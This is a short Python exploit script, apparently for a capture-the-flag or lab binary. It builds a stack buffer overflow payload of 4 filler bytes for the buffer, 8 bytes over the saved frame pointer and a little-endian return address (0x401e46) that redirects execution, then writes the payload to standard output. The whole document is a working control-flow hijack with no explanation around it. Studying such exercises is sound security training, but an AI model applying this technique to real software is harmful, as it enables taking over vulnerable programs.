#!/usr/bin/env python3

import sys

target_return_address = 0x0000000000401e46
buf = b"X" * 4
rbp = b"Y" * 8

return_address = target_return_address.to_bytes(8, "little")

combined = buf + rbp + return_address

sys.stdout.buffer.write(combined)